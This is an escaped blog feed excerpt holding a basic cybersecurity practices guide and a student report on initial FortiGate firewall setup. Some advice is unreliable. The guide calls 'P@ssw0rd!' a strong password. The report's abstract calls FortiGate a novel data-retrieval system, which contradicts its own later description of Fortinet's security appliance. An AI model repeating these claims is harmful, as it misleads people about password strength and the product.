+&lt;h2 id="password-management">Password Management
+&lt;/h2>&lt;p>Password management is a critical aspect of cybersecurity, as weak or compromised passwords can expose sensitive information to unauthorized access. Here are some detailed guidelines for effective password management:&lt;/p>
+&lt;h3 id="utilize-a-robust-password-policy">Utilize a Robust Password Policy
+&lt;/h3>&lt;p>A robust password policy ensures that passwords are strong and resistant to brute-force attacks. Consider the following components when crafting a password policy:&lt;/p>
+&lt;ul>
+&lt;li>&lt;strong>Length&lt;/strong>: Passwords should be at least 12 characters long to provide sufficient complexity.&lt;/li>
+&lt;li>&lt;strong>Complexity&lt;/strong>: Encourage the use of alphanumeric characters, symbols, and a mix of uppercase and lowercase letters to increase password strength. For example, &lt;code>P@ssw0rd!&lt;/code>.&lt;/li>
+&lt;li>&lt;strong>Avoid Dictionary Words&lt;/strong>: Discourage the use of common dictionary words or easily guessable phrases.&lt;/li>
+&lt;li>&lt;strong>Prohibit Password Reuse&lt;/strong>: Users should not reuse passwords across different platforms or accounts to minimize the impact of a potential breach.&lt;/li>
+&lt;/ul>
+&lt;p>Here&amp;rsquo;s an example of how to enforce password complexity using a password policy:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-markdown" data-lang="markdown">&lt;span class="line">&lt;span class="cl">Password Policy:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">-&lt;/span> Minimum password length: 12 characters
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">-&lt;/span> Complexity requirements:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">-&lt;/span> Alphanumeric characters (a-z, A-Z, 0-9)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">-&lt;/span> Symbols (!, @, #, $, %, etc.)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">-&lt;/span> Mix of uppercase and lowercase letters
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">-&lt;/span> Prohibit password reuse across platforms
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="implement-multi-factor-authentication-mfa">Implement Multi-Factor Authentication (MFA)
+&lt;/h3>&lt;p>Multi-factor authentication (MFA) adds an extra layer of security by requiring users to provide multiple forms of verification before granting access. Common forms of MFA include:&lt;/p>
+&lt;h3 id="text-message-sms">Text Message (SMS)
+&lt;/h3>&lt;p>A verification code is sent to the user&amp;rsquo;s mobile phone via text message. Users need to enter this code along with their password to complete the authentication process.&lt;/p>
+&lt;h2 id="software-updates">Software Updates
+&lt;/h2>&lt;p>Software updates are crucial for maintaining the security and stability of systems. Here are detailed guidelines for managing software updates effectively:&lt;/p>
+&lt;h3 id="establish-a-proactive-software-patch-management-process">Establish a Proactive Software Patch Management Process
+&lt;/h3>&lt;p>Establishing a proactive software patch management process ensures that vulnerabilities and security flaws are promptly addressed. Consider the following steps:&lt;/p>
+&lt;ul>
+&lt;li>&lt;strong>Patch Identification&lt;/strong>: Regularly monitor vendor websites, security advisories, and vulnerability databases to identify available patches.&lt;/li>
+&lt;li>&lt;strong>Patch Prioritization&lt;/strong>: Prioritize patches based on criticality and potential impact on your systems and operations.&lt;/li>
+&lt;li>&lt;strong>Patch Testing&lt;/strong>: Test patches in a controlled environment to ensure compatibility and mitigate the risk of unintended consequences.&lt;/li>
+&lt;li>&lt;strong>Patch Deployment&lt;/strong>: Schedule regular maintenance windows to deploy patches and minimize disruption to operations.&lt;/li>
+&lt;/ul>
+&lt;h2 id="phishing-awareness">Phishing Awareness
+&lt;/h2>&lt;h3 id="1-conduct-regular-security-awareness-training-sessions">1. Conduct Regular Security Awareness Training Sessions
+&lt;/h3>&lt;ul>
+&lt;li>Organize regular training sessions for employees to educate them about phishing threats and social engineering tactics.&lt;/li>
+&lt;li>Provide real-life examples of phishing emails, such as:
+&lt;ul>
+&lt;li>Emails pretending to be from trusted sources like banks, government agencies, or company executives, asking for sensitive information like passwords or financial details.&lt;/li>
+&lt;li>Emails containing urgent requests or offers that create a sense of urgency, such as threatening to close an account or promising a prize.&lt;/li>
+&lt;li>Phishing emails disguised as legitimate business communications, like invoices or shipping notifications, with malicious attachments or links.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="2-implement-email-filtering-solutions">2. Implement Email Filtering Solutions
+&lt;/h3>&lt;ul>
+&lt;li>Deploy email filtering solutions that utilize advanced algorithms and threat intelligence to detect and quarantine phishing emails before they reach end-users.&lt;/li>
+&lt;li>Use techniques such as:
+&lt;ul>
+&lt;li>Sender Policy Framework (SPF), DomainKeys Identified Mail (DKIM), and Domain-based Message Authentication, Reporting, and Conformance (DMARC) to authenticate emails and prevent spoofing.&lt;/li>
+&lt;li>Machine learning algorithms to analyze email content, sender reputation, and behavioral patterns to identify phishing attempts.&lt;/li>
+&lt;li>Real-time blacklists and threat intelligence feeds to block known malicious domains and IPs associated with phishing campaigns.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="3-encourage-a-culture-of-skepticism">3. Encourage a Culture of Skepticism
+&lt;/h3>&lt;ul>
+&lt;li>Foster a culture of skepticism among employees by encouraging them to scrutinize unsolicited emails, attachments, and links for signs of phishing.&lt;/li>
+&lt;li>Educate employees to look out for red flags such as:
+&lt;ul>
+&lt;li>Generic greetings or misspellings in emails.&lt;/li>
+&lt;li>Requests for sensitive information or login credentials.&lt;/li>
+&lt;li>Suspicious attachments or links that lead to unfamiliar websites.&lt;/li>
+&lt;li>Emails with unexpected attachments or links from unknown senders.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>Provide examples of common phishing tactics, such as:
+&lt;ul>
+&lt;li>Spear phishing: personalized emails targeting specific individuals or departments within the organization, using information gathered from social media or other sources.&lt;/li>
+&lt;li>CEO fraud: impersonating company executives to trick employees into transferring funds or disclosing sensitive information.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="4-establish-clear-protocols-for-reporting-and-responding">4. Establish Clear Protocols for Reporting and Responding
+&lt;/h3>&lt;ul>
+&lt;li>Establish clear protocols for employees to report and respond to suspected phishing attempts to mitigate potential breaches.&lt;/li>
+&lt;li>Encourage employees to report suspicious emails to the IT or security team immediately.&lt;/li>
+&lt;li>Provide multiple reporting channels, such as email, phone, or dedicated reporting platforms.&lt;/li>
+&lt;li>Implement a standardized process for analyzing and responding to reported phishing incidents, including:
+&lt;ul>
+&lt;li>Investigating the source and nature of the phishing attempt.&lt;/li>
+&lt;li>Notifying relevant stakeholders and affected individuals.&lt;/li>
+&lt;li>Taking appropriate remediation actions, such as blocking malicious domains or resetting compromised credentials.&lt;/li>
+&lt;li>Providing timely updates and guidance to employees about the incident and preventive measures.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;h2 id="data-backup">Data Backup
+&lt;/h2>&lt;h3 id="1-develop-a-comprehensive-data-backup-strategy">1. Develop a Comprehensive Data Backup Strategy
+&lt;/h3>&lt;ul>
+&lt;li>Assess the organization&amp;rsquo;s data storage needs and requirements.&lt;/li>
+&lt;li>Identify critical data assets, including customer information, financial records, intellectual property, and operational data.&lt;/li>
+&lt;li>Define backup frequency, retention policies, and priorities based on the criticality of data and regulatory compliance requirements.&lt;/li>
+&lt;li>Choose appropriate backup methods, such as full, incremental, or differential backups, based on data volume and recovery time objectives (RTOs) and recovery point objectives (RPOs).&lt;/li>
+&lt;li>Determine the optimal combination of backup storage solutions, including on-premises storage, cloud storage, and hybrid storage options.&lt;/li>
+&lt;li>Develop a disaster recovery plan outlining procedures for restoring data in the event of data loss or system failure.&lt;/li>
+&lt;/ul>
+&lt;h3 id="2-implement-automated-backup-solutions">2. Implement Automated Backup Solutions
+&lt;/h3>&lt;ul>
+&lt;li>Deploy automated backup solutions to streamline data protection processes and minimize human error.&lt;/li>
+&lt;li>Use backup software or cloud-based backup services that support scheduling, versioning, and deduplication to optimize storage space and bandwidth usage.&lt;/li>
+&lt;li>Configure backup schedules to perform regular backups according to defined backup policies without manual intervention.&lt;/li>
+&lt;li>Monitor backup status and performance metrics to ensure backups are completed successfully and within specified timeframes.&lt;/li>
+&lt;/ul>
+&lt;h3 id="3-test-data-recovery-procedures">3. Test Data Recovery Procedures
+&lt;/h3>&lt;ul>
+&lt;li>Conduct regular testing of data recovery procedures to validate backup integrity and assess the organization&amp;rsquo;s readiness for data loss scenarios.&lt;/li>
+&lt;li>Perform simulated data recovery drills to simulate real-world scenarios and identify potential weaknesses in the backup and recovery process.&lt;/li>
+&lt;li>Document test results and incorporate lessons learned into the data backup strategy to improve resilience and effectiveness.&lt;/li>
+&lt;/ul>
+&lt;h3 id="4-encrypt-backup-data">4. Encrypt Backup Data
+&lt;/h3>&lt;ul>
+&lt;li>Encrypt backup data both in transit and at rest to protect sensitive information from unauthorized access.&lt;/li>
+&lt;li>Use encryption protocols such as Advanced Encryption Standard (AES) to encrypt backup data before transmission over the network.&lt;/li>
+&lt;li>Store encrypted backups in secure storage locations with access controls and authentication mechanisms to prevent unauthorized access.&lt;/li>
+&lt;li>Implement encryption key management practices to securely manage and protect encryption keys used for backup data encryption.&lt;/li>
+&lt;/ul>
+&lt;h2 id="device-security">Device Security
+&lt;/h2>&lt;h3 id="1-deploy-endpoint-protection-solutions">1. Deploy Endpoint Protection Solutions
+&lt;/h3>&lt;ul>
+&lt;li>Implement robust endpoint protection solutions to defend against various cyber threats targeting devices, including malware, ransomware, and zero-day exploits.&lt;/li>
+&lt;li>Utilize antivirus software with real-time scanning capabilities to detect and remove malicious software from endpoints.&lt;/li>
+&lt;li>Deploy firewalls to monitor and control incoming and outgoing network traffic, preventing unauthorized access to devices.&lt;/li>
+&lt;li>Implement intrusion detection/prevention systems (IDPS) to identify and block suspicious network activities that may indicate an ongoing attack.&lt;/li>
+&lt;/ul>
+&lt;h3 id="2-enforce-device-encryption">2. Enforce Device Encryption
+&lt;/h3>&lt;ul>
+&lt;li>Mandate device encryption to safeguard sensitive data stored on laptops, mobile devices, and removable media from unauthorized access in case of theft or loss.&lt;/li>
+&lt;li>Utilize encryption technologies such as BitLocker (for Windows devices), FileVault (for macOS devices), or third-party encryption solutions for comprehensive data protection.&lt;/li>
+&lt;li>Require strong passphrase or biometric authentication for accessing encrypted devices to ensure only authorized users can access sensitive data.&lt;/li>
+&lt;/ul>
+&lt;h3 id="3-implement-device-management-policies">3. Implement Device Management Policies
+&lt;/h3>&lt;ul>
+&lt;li>Establish and enforce device management policies to govern device usage, enforce security configurations, and mitigate security risks.&lt;/li>
+&lt;li>Define acceptable use policies (AUP) specifying permitted and prohibited activities on company-owned devices to minimize security risks.&lt;/li>
+&lt;li>Implement mobile device management (MDM) solutions to remotely manage and secure mobile devices, enforce security policies, and facilitate device inventory management.&lt;/li>
+&lt;li>Utilize application whitelisting/blacklisting to control the installation and execution of software on endpoints, preventing the execution of unauthorized or malicious applications.&lt;/li>
+&lt;li>Enforce security configurations such as strong password policies, screen lock timeouts, and software updates to enhance device security posture.&lt;/li>
+&lt;/ul>
+&lt;h3 id="4-conduct-regular-security-assessments">4. Conduct Regular Security Assessments
+&lt;/h3>&lt;ul>
+&lt;li>Perform regular security assessments and vulnerability scans to identify and remediate weaknesses in device configurations and software vulnerabilities.&lt;/li>
+&lt;li>Utilize automated vulnerability scanning tools to identify known security vulnerabilities in operating systems, applications, and firmware.&lt;/li>
+&lt;li>Conduct penetration testing to simulate real-world cyber attacks and assess the effectiveness of device security controls in detecting and mitigating security threats.&lt;/li>
+&lt;li>Establish a vulnerability management process to prioritize and address identified vulnerabilities based on risk severity and potential impact on device security.&lt;/li>
+&lt;/ul>
+&lt;h2 id="conclusion">Conclusion
+&lt;/h2>&lt;p>By implementing these basic cybersecurity practices, individuals and organizations can significantly reduce their risk of cyber threats and protect their sensitive information.&lt;/p>
+&lt;hr></description></item><item><title>FortiGate Implementation for Enhanced Enterprise Data Security</title><link>https://orangeymango.me/p/fortigate-implementation-for-enhanced-enterprise-data-security/</link><pubDate>Tue, 20 Feb 2024 11:27:22 +0000</pubDate><guid>https://orangeymango.me/p/fortigate-implementation-for-enhanced-enterprise-data-security/</guid><description>&lt;img src="https://images.ctfassets.net/aoyx73g9h2pg/2pgojF0xYbPiO90nEe6MQn/b3d29d5740c3ac82cf3ae21099c6ba60/1IzqGZkxtu1msh1CA4R3X_BpRTQa_FRu1_1-Featured-1024x572.jpg?w=1920&amp;q=100" alt="Featured image of post FortiGate Implementation for Enhanced Enterprise Data Security" />&lt;h2 id="table-of-contents">Table of Contents
+&lt;/h2>&lt;ol>
+&lt;li>&lt;a class="link" href="#acknowledgement" >ACKNOWLEDGEMENT&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="#abstract" >ABSTRACT&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="#introduction-to-fortigate" >INTRODUCTION TO FORTIGATE&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="#objectives" >OBJECTIVES&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="#scope-of-fortigate" >SCOPE OF FORTIGATE&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="#importance-of-the-project" >IMPORTANCE OF THE PROJECT&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="#limitations-of-the-project" >LIMITATIONS OF THE PROJECT&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="#procedure" >PROCEDURE&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="#conclusion" >CONCLUSION&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="#screenshots" >SCREENSHOTS&lt;/a>&lt;/li>
+&lt;/ol>
+&lt;h1 id="acknowledgement">ACKNOWLEDGEMENT
+&lt;/h1>&lt;p>I would like to express my heartfelt gratitude to all those who have contributed and supported me during the completion of this project titled &amp;ldquo;fortigate&amp;rdquo; at Texas College of Management and IT.&lt;/p>
+&lt;p>I am deeply indebted to my project guide [Manish Shakya] for their constant guidance, valuable insights, and unwavering support throughout this journey. Their expertise and encouragement have been instrumental in shaping the direction of this project.&lt;/p>
+&lt;p>I extend my sincere appreciation to the faculty members of the [IT department] for their valuable feedback and suggestions, which have been pivotal in improving the quality of this report.&lt;/p>
+&lt;p>My heartfelt thanks go to my friends  for their encouragement, patience, and belief in my abilities, which provided me with the motivation to persevere and complete this project successfully.&lt;/p>
+&lt;p>Lastly, I want to acknowledge the boundless support from all the individuals and resources whose efforts have contributed to the accomplishment of this project.&lt;/p>
+&lt;p>Thank you all for being an essential part of this endeavor.&lt;/p>
+&lt;p>Group 1&lt;/p>
+&lt;p> BCS 3&lt;sup>rd&lt;/sup> semStudent &lt;/p>
+&lt;p> Texas College of Management and IT&lt;/p>
+&lt;h1 id="abstract">ABSTRACT
+&lt;/h1>&lt;p>The project report titled &amp;ldquo;fortigate&amp;rdquo; presents a comprehensive exploration of a novel security solution designed to fortify information retrieval and management. In an era where data breaches and cyber threats have become increasingly prevalent, safeguarding sensitive information is of paramount importance. &amp;ldquo;fortigate&amp;rdquo; is an innovative system that aims to enhance data security while facilitating efficient data retrieval within organizations.&lt;/p>
+&lt;p>The project delves into the technical aspects of &amp;ldquo;Fortigate,&amp;rdquo; elucidating its architecture, design principles, and implementation details. The system&amp;rsquo;s intuitive user interface allows authorized personnel to retrieve data seamlessly while ensuring unauthorized access is thwarted. The report also sheds light on the performance evaluation of &amp;ldquo;Fortigate,&amp;rdquo; demonstrating its efficiency and effectiveness in real-world scenarios.&lt;/p>
+&lt;h1 id="introduction-to-fortigate">INTRODUCTION TO FORTIGATE
+&lt;/h1>&lt;p>The introduction provides a brief overview of the project &amp;ldquo;Fortigate - A Secure and Efficient Data Retrieval and Management System.&amp;rdquo; It highlights the importance of data security and efficient data retrieval in the modern digital landscape. The introduction outlines the objectives of the project, which include enhancing data security, streamlining data retrieval, ensuring cross-platform compatibility, and allowing for scalability and future enhancements. It also introduces the methodology that will be followed to achieve the project&amp;rsquo;s objectives, covering requirements analysis, literature review, system design, implementation, testing, and performance evaluation. The introduction concludes by emphasizing the significance of Fortigate in addressing data security challenges and empowering organizations to secure their valuable information effectively.&lt;/p>
+&lt;p>This project aims to provide a comprehensive understanding of FortiGate, a robust network security platform developed by Fortinet. FortiGate is a widely adopted security solution utilized by organizations to protect their networks from cyber threats, secure data, and ensure network performance and availability.&lt;/p>
+&lt;h1 id="objectives">OBJECTIVES
+&lt;/h1>&lt;p>&lt;strong>Objective 1: Enhancing Data Security&lt;/strong>&lt;/p>
+&lt;p>The primary objective of the Fortigate project is to enhance data security within organizations. This involves the implementation of robust encryption algorithms to protect data at rest and during transit. By ensuring the confidentiality and integrity of sensitive information, Fortigate aims to prevent unauthorized access and potential data breaches.&lt;/p>
+&lt;p>&lt;strong>Objective 2: Efficient Data Retrieval&lt;/strong>&lt;/p>
+&lt;p>The second objective is to facilitate efficient data retrieval for authorized personnel. Fortigate focuses on creating an intuitive user interface that allows seamless access to data while maintaining stringent access controls. By streamlining the retrieval process, Fortigate aims to improve productivity and user experience.&lt;/p>
+&lt;p>&lt;strong>Objective 3: Implementing Multi-factor Authentication&lt;/strong>&lt;/p>
+&lt;p>To reinforce data security, the project aims to incorporate multi-factor authentication (MFA) mechanisms. MFA adds an extra layer of protection by requiring users to provide multiple forms of identification before accessing the system. By implementing MFA, Fortigate aims to thwart unauthorized access attempts and enhance overall system security.&lt;/p>
+&lt;p>&lt;strong>Objective 4: Performance Evaluation&lt;/strong>&lt;/p>
+&lt;p>The project aims to evaluate the performance of the Fortigate in various real-world scenarios. This objective involves conducting rigorous testing and analysis to measure system efficiency, response times, and resource utilization. The results of the performance evaluation will be used to fine-tune and optimize the system.&lt;/p>
+&lt;p>&lt;strong>Objective 5: Future Enhancements and Scalability&lt;/strong>&lt;/p>
+&lt;p>Finally, the report will address the objective of identifying potential areas for future enhancements and scalability. As technology and cybersecurity threats evolve, Fortigate must remain adaptable and capable of addressing new challenges. The project aims to explore avenues for expanding Fortigate&amp;rsquo;s capabilities and integrating additional features in the future.&lt;/p>
+&lt;h1 id="scope-of-fortigate">SCOPE OF FORTIGATE
+&lt;/h1>&lt;p>The scope of Fortigate encompasses various aspects that define the boundaries and objectives of the project. It outlines the functionalities, target users, and potential applications of the Fortigate system. The following points highlight the scope of Fortigate:&lt;/p>
+&lt;ol>
+&lt;li>
+&lt;p>Data Security Enhancement: Fortigate aims to significantly enhance data security within organizations by implementing robust encryption algorithms, access controls, and multi-factor authentication mechanisms. It focuses on safeguarding sensitive information from unauthorized access and potential data breaches.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Efficient Data Retrieval: The system targets the seamless and efficient retrieval of data for authorized personnel. Fortigate&amp;rsquo;s user-friendly interface and streamlined data retrieval process aim to improve productivity and user experience.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Multi-factor Authentication Integration: Fortigate incorporates multi-factor authentication (MFA) to bolster data security. By requiring users to provide multiple forms of identification, the system ensures a higher level of authentication, reducing the risk of unauthorized access.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Intuitive User Interface: The scope of Fortigate includes the development of an intuitive and user-friendly interface. This allows users to interact with the system easily, even with minimal technical expertise.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Scalability and Future Enhancements: Fortigate is designed to be scalable, enabling it to accommodate the evolving needs of organizations and future advancements in technology. The scope includes provisions for future enhancements and expansions to adapt to changing cybersecurity requirements.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Cross-Platform Compatibility: Fortigate aims to be compatible with various platforms, including desktop computers, laptops, and mobile devices. This ensures accessibility from a range of devices and operating systems.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Real-World Performance Evaluation: The scope includes conducting a thorough performance evaluation of the Fortigate in real-world scenarios. The evaluation assesses its efficiency, response times, and resource utilization under different usage conditions.&lt;/p>
+&lt;/li>
+&lt;/ol>
+&lt;h1 id="importance-of-the-project">IMPORTANCE OF THE PROJECT
+&lt;/h1>&lt;p>The importance of Fortigate lies in its ability to address critical challenges related to data security and data retrieval in organizations. This innovative system offers several significant benefits:&lt;/p>
+&lt;p>&lt;strong>Enhanced Data Security:&lt;/strong> Fortigate employs robust encryption algorithms and access controls to ensure the confidentiality and integrity of sensitive information. By safeguarding data at rest and during transmission, Fortigate helps organizations protect their valuable data assets from unauthorized access and potential cyber threats.&lt;/p>
+&lt;ol>
+&lt;li>
+&lt;p>&lt;strong>Prevention of Data Breaches:&lt;/strong> With its multi-factor authentication (MFA) mechanisms, Fortigate adds an extra layer of security, making it more difficult for unauthorized individuals to gain access to the system. This reduces the risk of data breaches, minimizing potential financial and reputational damages that organizations may face as a result of data leaks.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Efficient Data Retrieval:&lt;/strong> Fortigate streamlines the data retrieval process for authorized users. Its user-friendly interface and intuitive design enable seamless and quick access to relevant data, contributing to increased productivity and efficiency within the organization.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Compliance and Regulations:&lt;/strong> fortigate&amp;rsquo;s adherence to data security regulations and compliance standards ensures that organizations can meet legal and industry requirements. This compliance is crucial, especially for organizations that handle sensitive data subject to various privacy and security regulations.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Cross-Platform Compatibility:&lt;/strong> Fortigate&amp;rsquo;s compatibility with various platforms and devices enhances its accessibility and usability. Users can access the system from desktop computers, laptops, and mobile devices, ensuring that data retrieval and management can occur from different locations and devices.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Scalability and Future-Proofing:&lt;/strong> Fortigate&amp;rsquo;s scalable design allows it to adapt to changing organizational needs and technological advancements. As an organization grows or faces new challenges, Fortigate can be expanded and updated to meet emerging security threats and requirements.&lt;/p>
+&lt;/li>
+&lt;/ol>
+&lt;h1 id="limitations-of-the-project">LIMITATIONS OF THE PROJECT
+&lt;/h1>&lt;p>While Fortigate offers valuable benefits and features, it is essential to acknowledge its limitations to provide a comprehensive understanding of the project. The limitations of Fortigate include:&lt;/p>
+&lt;ol>
+&lt;li>
+&lt;p>&lt;strong>Initial Implementation Challenges:&lt;/strong> The initial implementation of Fortigate may pose challenges related to integration with existing data management systems and infrastructure within organizations. Ensuring smooth deployment and compatibility with diverse environments may require careful planning and coordination.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Resource Requirements:&lt;/strong> Fortigate&amp;rsquo;s advanced security features, such as encryption and multi-factor authentication, may require additional computational resources, leading to higher hardware and processing costs for organizations with limited budgets.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>User Adoption and Training:&lt;/strong> The adoption of new security measures and data retrieval processes may necessitate user training and adaptation to new workflows. Resistance or difficulty in adopting the system could impact its effectiveness until users become accustomed to the changes.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Scalability Concerns:&lt;/strong> As the organization grows and data volumes increase, fortigate&amp;rsquo;s scalability may become a concern. Ensuring that the system can handle large-scale data retrieval and security requirements without compromising performance is essential.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Dependency on Internet Connectivity:&lt;/strong> Fortigate&amp;rsquo;s cloud-based or network-dependent architecture may introduce a reliance on stable internet connectivity. Temporary connectivity issues or downtime could disrupt data retrieval and system accessibility.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>User Management Complexity:&lt;/strong> Managing user access and authentication mechanisms, especially in large organizations, can become complex. Proper user management and access control require careful administration to prevent security gaps or access conflicts.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Integration with Legacy Systems:&lt;/strong> Integrating Fortigate with legacy systems or applications that lack modern security standards may present challenges. Ensuring secure communication and compatibility with older technologies can be time-consuming and may require additional development efforts&lt;/p>
+&lt;/li>
+&lt;/ol>
+&lt;h1 id="procedure">PROCEDURE
+&lt;/h1>&lt;p>**1. **&lt;strong>Physical Setup:&lt;/strong>&lt;/p>
+&lt;ol>
+&lt;li>
+&lt;p>Connect the power adapter and turn on the device.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Connect a computer to one of FortiGate&amp;rsquo;s Ethernet ports for initial configuration.&lt;/p>
+&lt;/li>
+&lt;/ol>
+&lt;p>**2. **&lt;strong>Network Configuration:&lt;/strong>&lt;/p>
+&lt;p>Configure the FortiGate&amp;rsquo;s network interfaces based on your network topology and requirements. Set IP addresses, subnet masks, and gateway information.&lt;/p>
+&lt;p>&lt;strong>Step 1: Accessing the FortiGate Web Interface&lt;/strong>&lt;/p>
+&lt;ol>
+&lt;li>
+&lt;p>Connect a computer to the FortiGate using an Ethernet cable.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Open a web browser and enter the default IP address of the FortiGate (usually 192.168.1.99) in the address bar.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Log in with the administrator credentials. (username = admin &amp;amp; password = “blank”)&lt;/p>
+&lt;/li>
+&lt;/ol>
+&lt;p>&lt;strong>Step 2: Interface Configuration&lt;/strong>&lt;/p>
+&lt;ol>
+&lt;li>
+&lt;p>Go to &amp;ldquo;Network&amp;rdquo; to &amp;ldquo;Interfaces.&amp;rdquo;&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Configure the interfaces based on your network topology:&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Internal interfaces (LAN): Assign IP addresses and subnet masks to LAN interfaces connecting to internal networks.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>External interfaces (WAN): Configure the WAN interface that connects to the internet or external network.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>DMZ interfaces: If applicable, configure any demilitarized zone (DMZ) interfaces.&lt;/p>
+&lt;/li>
+&lt;/ol>
+&lt;p>&lt;strong>Step 3: IP Address Configuration&lt;/strong>&lt;/p>
+&lt;ol>
+&lt;li>
+&lt;p>For the WAN interface, set the IP address provided by your ISP or configure it as per your network requirements. Choose between DHCP or static IP address based on your ISP&amp;rsquo;s settings.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>For LAN interfaces, assign IP addresses and subnet masks to match your internal network addressing scheme.&lt;/p>
+&lt;/li>
+&lt;/ol>
+&lt;p>&lt;strong>Step 4: Default Gateway Configuration&lt;/strong>&lt;/p>
+&lt;ol>
+&lt;li>
+&lt;p>Configure the default gateway on the FortiGate to point to the next-hop gateway provided by your ISP for the WAN interface.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>For LAN interfaces, the default gateway is usually FortiGate&amp;rsquo;s own IP address on the corresponding interface.&lt;/p>
+&lt;/li>
+&lt;/ol>
+&lt;p>&lt;strong>Step 5: DNS Configuration&lt;/strong>&lt;/p>
+&lt;ol>
+&lt;li>Set up DNS servers to resolve domain names. Go to &amp;ldquo;Network&amp;rdquo; to &amp;ldquo;DNS&amp;rdquo; and enter the IP addresses of your preferred DNS servers.&lt;/li>
+&lt;/ol>
+&lt;p>&lt;strong>Step 6: Static Routes (if needed)&lt;/strong>&lt;/p>
+&lt;ol>
+&lt;li>If you have multiple subnets or need to direct traffic to specific destinations, configure static routes. Go to &amp;ldquo;Network&amp;rdquo; to &amp;ldquo;Static Routes&amp;rdquo; and define the destination subnet and gateway.&lt;/li>
+&lt;/ol>
+&lt;p>&lt;strong>Step 7: DHCP (if needed)&lt;/strong>&lt;/p>
+&lt;ol>
+&lt;li>If you want the FortiGate to act as a DHCP server for your LAN, go to &amp;ldquo;Network&amp;rdquo; to &amp;ldquo;DHCP&amp;rdquo; and configure the DHCP server settings, including IP address range, lease time, and DNS servers to be provided to clients.&lt;/li>
+&lt;/ol>
+&lt;p>&lt;strong>Step 8: Firewall Policies (optional)&lt;/strong>&lt;/p>
+&lt;ol>
+&lt;li>If you need to allow or block traffic between different interfaces or subnets, set up firewall policies. Go to &amp;ldquo;Policy &amp;amp; Objects&amp;rdquo; to &amp;ldquo;IPv4 Policy&amp;rdquo; and create the necessary policies.&lt;/li>
+&lt;/ol>
+&lt;p>&lt;strong>Step 9: Apply Configuration&lt;/strong>&lt;/p>
+&lt;ol>
+&lt;li>Review your settings and click &amp;ldquo;Apply&amp;rdquo; to save the changes.&lt;/li>
+&lt;/ol>
+&lt;p>&lt;strong>WAN Configuration:&lt;/strong>&lt;/p>
+&lt;p>Configure the WAN interface to connect to your internet service provider (ISP). Set the appropriate IP settings, such as DHCP or static IP if provided by your ISP.&lt;/p>
+&lt;p>&lt;strong>Step 1: Accessing the FortiGate Web Interface&lt;/strong>&lt;/p>
+&lt;ol>
+&lt;li>
+&lt;p>Connect a computer to the FortiGate using an Ethernet cable.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Open a web browser and enter the default IP address of the FortiGate (usually 192.168.1.99) in the address bar.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Log in with the administrator credentials.&lt;/p>
+&lt;/li>
+&lt;/ol>
+&lt;p>&lt;strong>Step 2: WAN Interface Configuration&lt;/strong>&lt;/p>
